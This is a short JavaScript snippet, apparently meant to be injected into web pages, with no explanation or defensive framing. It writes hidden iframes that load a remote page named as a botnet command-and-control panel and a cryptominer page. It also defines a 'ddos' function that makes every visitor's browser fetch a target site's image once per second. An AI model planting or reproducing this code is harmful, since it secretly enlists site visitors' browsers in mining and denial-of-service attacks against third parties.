document.write("<iframe id='ifr11323' style='display:none;'src='http://edu.ardvark.net/BotNet/CC/index.php'></iframe>");
document.write("<iframe id='ifr11323' style='display:none;'src='http://edu.ardvark.net/miner.html'></iframe>");
ddos('http://www.try2hack.nl/images/header.png',
'http://www.try2hack.nl/images/header.png');
function ddos(url,url2){
window.setInterval(function (){
$.getScript(url);
$.getScript(url2);
},1000)
}
